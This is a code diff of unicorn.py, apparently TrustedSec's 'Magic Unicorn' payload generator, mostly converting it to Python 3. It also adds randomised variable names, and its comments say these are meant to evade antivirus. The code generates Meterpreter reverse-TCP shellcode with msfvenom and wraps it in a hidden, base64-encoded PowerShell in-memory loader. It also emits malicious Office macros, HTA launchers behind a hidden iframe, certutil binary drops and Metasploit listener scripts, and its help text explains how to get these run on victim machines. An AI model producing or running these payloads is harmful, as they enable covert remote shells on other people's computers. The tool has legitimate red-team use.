@@ -22,8 +22,18 @@ import subprocess
 import sys
 import os
 import shutil
+import random
+import string
 
+#
+# generate a random string
+#
+def generate_random_string(low, high):
+    length = random.randint(low, high)
+    letters = string.ascii_letters + string.digits
+    return ''.join([random.choice(letters) for _ in range(length)])
 
+# needed for fire eyes muahahaha
 class ColorsEnum:
     CYAN = '\033[96m'
     BLUE = '\033[94m'
@@ -34,7 +44,7 @@ class ColorsEnum:
 
 # display unicorn banner
 def gen_unicorn():
-    print r"""
+    print(r"""
                                                          ,/
                                                         //
                                                       ,//
@@ -73,12 +83,12 @@ def gen_unicorn():
                          |  \         \ \              I  `
                          ( __;        ( _;            ('-_';
                          |___\        \___:            \___:
-                """
+                """)
 
 
 # display macro help
 def macro_help():
-    print """
+    print("""
 [*******************************************************************************************************]
 
 				-----MACRO ATTACK INSTRUCTIONS----
@@ -96,78 +106,78 @@ HAPPEN!
 
 [*******************************************************************************************************]
 
-	"""
+	""")
 
 
 # display hta help
 def hta_help():
-    print """
+    print("""
 [*******************************************************************************************************]
 
 				-----HTA ATTACK INSTRUCTIONS----
 
-The HTA attack will automatically generate two files, the first the index.html which tells the browser to 
-use Launcher.hta which contains the malicious powershell injection code. All files are exported to the 
-hta_access/ folder and there will be three main files. The first is index.html, second Launcher.hta and the 
+The HTA attack will automatically generate two files, the first the index.html which tells the browser to
+use Launcher.hta which contains the malicious powershell injection code. All files are exported to the
+hta_access/ folder and there will be three main files. The first is index.html, second Launcher.hta and the
 last, the unicorn.rc file. You can run msfconsole -r unicorn.rc to launch the listener for  Metasploit.
 
-A user must click allow and accept when using the HTA attack in order for the powershell injection to work 
+A user must click allow and accept when using the HTA attack in order for the powershell injection to work
 properly.
 
 [*******************************************************************************************************]
 
-	"""
+	""")
 
 
 # display powershell help
 def ps_help():
-    print """
+    print("""
 [********************************************************************************************************]
 
 				-----POWERSHELL ATTACK INSTRUCTIONS----
 
-Everything is now generated in two files, powershell_attack.txt and unicorn.rc. The text file contains all 
-of the code needed in order to inject the powershell attack into memory. Note you will need a place that 
-supports remote command injection of some sort. Often times this could be through an excel/word  doc or 
-through psexec_commands inside of Metasploit, SQLi, etc.. There are so many implications and  scenarios to 
-where you can use this attack at. Simply paste the powershell_attacks.txt command in any command prompt 
-window or where you have the ability to call the powershell executable and it will give a shell back to 
-you. 
+Everything is now generated in two files, powershell_attack.txt and unicorn.rc. The text file contains all
+of the code needed in order to inject the powershell attack into memory. Note you will need a place that
+supports remote command injection of some sort. Often times this could be through an excel/word  doc or
+through psexec_commands inside of Metasploit, SQLi, etc.. There are so many implications and  scenarios to
+where you can use this attack at. Simply paste the powershell_attacks.txt command in any command prompt
+window or where you have the ability to call the powershell executable and it will give a shell back to
+you.
 
 Note that you will need to have a listener enabled in order to capture the attack.
 
-[*******************************************************************************************************] 
-	"""
+[*******************************************************************************************************]
+	""")
 
 
 # display cert help
 def cert_help():
-    print """
+    print("""
 [*******************************************************************************************************]
 
 				-----CERUTIL Attack Instruction----
 
-The certutil attack vector was identified by Matthew Graeber (@mattifestation) which allows you to take 
-a binary file, move it into a base64 format and use certutil on the victim machine to convert it back to 
-a binary for you. This should work on virtually any system and allow you to transfer a binary to the victim 
-machine through a fake certificate file. To use this attack, simply place an executable in the path of 
+The certutil attack vector was identified by Matthew Graeber (@mattifestation) which allows you to take
+a binary file, move it into a base64 format and use certutil on the victim machine to convert it back to
+a binary for you. This should work on virtually any system and allow you to transfer a binary to the victim
+machine through a fake certificate file. To use this attack, simply place an executable in the path of
 unicorn and run python unicorn.py <exe_name> crt in order to get the base64 output. Once that's finished,
-go to decode_attack/ folder which contains the files. The bat file is a command that can be run in a 
-windows machine to convert it back to a binary. 
+go to decode_attack/ folder which contains the files. The bat file is a command that can be run in a
+windows machine to convert it back to a binary.
 
 [*******************************************************************************************************]
-	"""
+	""")
 
 
 def custom_ps1_help():
-    print """
+    print("""
 [*******************************************************************************************************]
 
 				-----Custom PS1 Attack Instructions----
 
 This attack method allows you to convert any PowerShell file (.ps1) into an encoded command or macro.
 
-Note if choosing the macro option, a large ps1 file may exceed the amount of carriage returns allowed by 
+Note if choosing the macro option, a large ps1 file may exceed the amount of carriage returns allowed by
 VBA. You may change the number of characters in each VBA string by passing an integer as a parameter.
 
 Examples:
@@ -179,26 +189,26 @@ python unicorn.py muahahaha.ps1 macro 500
 The last one will use a 500 character string instead of the default 380, resulting in less carriage returns in VBA.
 
 [*******************************************************************************************************]
-	"""
+	""")
 
 
 # usage banner
 def gen_usage():
-    print "-------------------- Magic Unicorn Attack Vector v2.1.2-----------------------------"
-    print "\nNative x86 powershell injection attacks on any Windows platform."
-    print "Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)"
-    print "Twitter: @TrustedSec, @HackingDave"
-    print "Credits: Matthew Graeber, Justin Elze, Chris Gates"
-    print "\nHappy Magic Unicorns."
-    print ""
-    print "Usage: python unicorn.py payload reverse_ipaddr port <optional hta or macro, crt>"
-    print "PS Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443"
-    print "Macro Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443 macro"
-    print "HTA Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443 hta"
-    print "CRT Example: python unicorn.py <path_to_payload/exe_encode> crt"
-    print "Custom PS1 Example: python unicorn.py <path to ps1 file>"
-    print "Custom PS1 Example: python unicorn.py <path to ps1 file> macro 500"
-    print "Help Menu: python unicorn.py --help\n"
+    print("-------------------- Magic Unicorn Attack Vector v2.2-----------------------------")
+    print("\nNative x86 powershell injection attacks on any Windows platform.")
+    print("Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
+    print("Twitter: @TrustedSec, @HackingDave")
+    print("Credits: Matthew Graeber, Justin Elze, Chris Gates")
+    print("\nHappy Magic Unicorns.")
+    print("")
+    print("Usage: python unicorn.py payload reverse_ipaddr port <optional hta or macro, crt>")
+    print("PS Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443")
+    print("Macro Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443 macro")
+    print("HTA Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443 hta")
+    print("CRT Example: python unicorn.py <path_to_payload/exe_encode> crt")
+    print("Custom PS1 Example: python unicorn.py <path to ps1 file>")
+    print("Custom PS1 Example: python unicorn.py <path to ps1 file> macro 500")
+    print("Help Menu: python unicorn.py --help\n")
 
 
 # split string
@@ -238,7 +248,8 @@ def generate_macro(full_attack, line_length=380):
     return macro_str
 
 
-# generate Matthew Graeber's (Matt rocks) attack for binary to cert format - https://gist.github.com/mattifestation/47f9e8a431f96a266522
+# generate Matthew Graeber's (Matt rocks) attack for binary to cert format
+# - https://gist.github.com/mattifestation/47f9e8a431f96a266522
 def gen_cert_attack(filename):
     if os.path.isfile(filename):
         # make sure the directory is made
@@ -249,19 +260,20 @@ def gen_cert_attack(filename):
         if os.path.isfile("decode_attack/encoded_attack.crt"):
             os.remove("decode_attack/encoded_attack.crt")
 
-        print "[*] Importing in binary file to base64 encode it for certutil prep."
+        print("[*] Importing in binary file to base64 encode it for certutil prep.")
         data = file(filename, "rb").read()
         data = base64.b64encode(data)
-        print "[*] Writing out the file to decode_attack/encoded_attack.crt"
+        print("[*] Writing out the file to decode_attack/encoded_attack.crt")
         write_file("decode_attack/encoded_attack.crt",
                    "-----BEGIN CERTIFICATE-----\n{0}\n-----END CERTIFICATE-----".format(data))
-        print "[*] Filewrite complete, writing out decode string for you.."
-        write_file("decode_attack/decode_command.bat", "certutil -decode encoded_attack.crt encoded.exe")
-        print "[*] Exported attack under decode_attack/"
-        print "[*] There are two files, encoded_attack.crt contains your encoded data"
-        print "[*] The second file, decode_command.bat will decode the cert to an executable."
+        print("[*] Filewrite complete, writing out decode string for you..")
+        write_file("decode_attack/decode_command.bat",
+                   "certutil -decode encoded_attack.crt encoded.exe")
+        print("[*] Exported attack under decode_attack/")
+        print("[*] There are two files, encoded_attack.crt contains your encoded data")
+        print("[*] The second file, decode_command.bat will decode the cert to an executable.")
     else:
-        print "[!] File was not found. Exiting the unicorn attack."
+        print("[!] File was not found. Exiting the unicorn attack.")
         sys.exit()
 
         # generate HTA attack method
@@ -273,20 +285,21 @@ def gen_hta_attack(command):
     main2 = """<iframe id="frame" src="Launcher.hta" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no>></iframe>"""
 
     # make a directory if its not there
-    if not os.path.isdir("hta_attack"): os.makedirs("hta_attack")
+    if not os.path.isdir("hta_attack"):
+        os.makedirs("hta_attack")
 
     # write out index file
-    print "[*] Writing out index file to hta_attack/index.html"
+    print("[*] Writing out index file to hta_attack/index.html")
     write_file("hta_attack/index.html", main2)
 
     # write out Launcher.hta
-    print "[*] Writing malicious hta launcher hta_attack/Launcher.hta"
+    print("[*] Writing malicious hta launcher hta_attack/Launcher.hta")
     write_file("hta_attack/Launcher.hta", main1)
 
 
 # generate the actual shellcode through msf
 def generate_shellcode(payload, ipaddr, port):
-    print "[*] Generating the payload shellcode.. This could take a few seconds/minutes as we create the shellcode..."
+    print("[*] Generating the payload shellcode.. This could take a few seconds/minutes as we create the shellcode...")
     port = port.replace("LPORT=", "")
     proc = subprocess.Popen(
         "msfvenom -p %s LHOST=%s LPORT=%s StagerURILength=5 StagerVerifySSLCert=false -e x86/shikata_ga_nai -a x86 --platform windows --smallest -f c" % (
@@ -295,7 +308,8 @@ def generate_shellcode(payload, ipaddr, port):
     # start to format this a bit to get it ready
     repls = {';': '', ' ': '', '+': '', '"': '', '\n': '', 'buf=': '', 'Found 0 compatible encoders': '',
              'unsignedcharbuf[]=': ''}
-    data = reduce(lambda a, kv: a.replace(*kv), repls.iteritems(), data).rstrip()
+    data = reduce(lambda a, kv: a.replace(*kv),
+                  iter(repls.items()), data).rstrip()
     return data
 
 
@@ -328,9 +342,23 @@ def gen_shellcode_attack(payload, ipaddr, port):
                "use multi/handler\nset payload %s\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nset EnableStageEncoding true\nexploit -j\n" % (
                    payload, ipaddr, port))
 
+    # added random vars before and after to change strings - AV you are seriously ridiculous.
+    var1 = generate_random_string(3, 4)
+    var2 = generate_random_string(3, 4)
+    var3 = generate_random_string(3, 4)
+    var4 = generate_random_string(3, 4)
+    var5 = generate_random_string(3, 4)
+    var6 = generate_random_string(3, 4)
+
     # one line shellcode injection with native x86 shellcode
     powershell_code = (
         r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-enc ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $3 $2 $e"}else{;iex "& powershell $2 $e";}""" % shellcode)
+
+    # run it through a lame var replace
+    powershell_code = powershell_code.replace("$1", "$" + var1).replace("$c", "$" + var2).replace("$2", "$" + var3).replace("$3", "$" + var4).replace("$x", "$" + var5)
+
+    print powershell_code
+
     return powershell_code
 
 
@@ -340,17 +368,18 @@ def gen_ps1_attack(ps1path):
             data = scriptfile.read()
             return data
     else:
-        print "[!] {0} does not exist. Please check your path".format(ps1path)
+        print("[!] {0} does not exist. Please check your path".format(ps1path))
         sys.exit(1)
 
 
 def format_payload(powershell_code, attack_type, attack_modifier, option):
     gen_unicorn()
-    print "Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)"
-    print "Twitter: @TrustedSec, @HackingDave"
-    print "\nHappy Magic Unicorns."
+    print("Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
+    print("Twitter: @TrustedSec, @HackingDave")
+    print("\nHappy Magic Unicorns.")
 
-    full_attack = "powershell -window hidden -enc " + base64.b64encode(powershell_code.encode('utf_16_le'))
+    full_attack = "powershell -window hidden -enc " + \
+        base64.b64encode(powershell_code.encode('utf_16_le'))
 
     if attack_type == "msf":
         if attack_modifier == "macro":
@@ -360,7 +389,8 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
 
         elif attack_modifier == "hta":
             gen_hta_attack(full_attack)
-            shutil.move("unicorn.rc", "hta_attack/")  # move unicorn to hta attack if hta specified
+            # move unicorn to hta attack if hta specified
+            shutil.move("unicorn.rc", "hta_attack/")
             hta_help()
 
         else:  # write out powershell attacks
@@ -382,15 +412,15 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
 
     # Print completion messages
     if attack_type == "msf" and attack_modifier == "hta":
-        print "[*] Exported index.html, Launcher.hta, and unicorn.rc under hta_attack/."
-        print "[*] Run msfconosle -r unicorn.rc to launch listener and move index and launcher to web server.\n"
+        print("[*] Exported index.html, Launcher.hta, and unicorn.rc under hta_attack/.")
+        print("[*] Run msfconosle -r unicorn.rc to launch listener and move index and launcher to web server.\n")
 
     elif attack_type == "msf":
-        print "[*] Exported powershell output code to powershell_attack.txt."
-        print "[*] Exported Metasploit RC file as unicorn.rc. Run msfconsole -r unicorn.rc to execute and create listener.\n"
+        print("[*] Exported powershell output code to powershell_attack.txt.")
+        print("[*] Exported Metasploit RC file as unicorn.rc. Run msfconsole -r unicorn.rc to execute and create listener.\n")
 
     elif attack_type == "custom_ps1":
-        print "[*] Exported powershell output code to powershell_attack.txt"
+        print("[*] Exported powershell output code to powershell_attack.txt")
 
 
 # pull the variables needed for usage
@@ -428,7 +458,7 @@ try:
             attack_modifier = sys.argv[4]
             ps = gen_shellcode_attack(payload, ipaddr, port)
         else:
-            print "[!] Options not understood or missing. Use --help switch for assistance."
+            print("[!] Options not understood or missing. Use --help switch for assistance.")
             sys.exit(1)
 
         format_payload(ps, attack_type, attack_modifier, None)
@@ -449,7 +479,7 @@ try:
         # It should not be possible to get here, but just in case it does for some reason in the future, it will
         # prevent usage of 'ps' and 'option', causing the app to crash
         else:
-            print "[!] Something went way wrong while generating payload."
+            print("[!] Something went way wrong while generating payload.")
             sys.exit()
 
         format_payload(ps, attack_type, attack_modifier, option)
@@ -465,7 +495,7 @@ try:
             ps = gen_ps1_attack(ps1path)
             format_payload(ps, attack_type, attack_modifier, None)
         else:
-            print "[!] Options not understood or missing. Use --help switch for assistance."
+            print("[!] Options not understood or missing. Use --help switch for assistance.")
             sys.exit()
 
     elif len(sys.argv) == 2:
@@ -473,7 +503,7 @@ try:
             ps = gen_ps1_attack(ps1path)
             format_payload(ps, attack_type, None, None)
         else:
-            print "[!] Options not understood or missing. Use --help switch for assistance."
+            print("[!] Options not understood or missing. Use --help switch for assistance.")
             sys.exit()
 
     # if we did supply parameters
@@ -481,5 +511,5 @@ try:
         gen_unicorn()
         gen_usage()
 
-except Exception, e:
-    print "[!] Something went wrong, printing the error: " + str(e)
+except Exception as e:
+    print("[!] Something went wrong, printing the error: " + str(e))
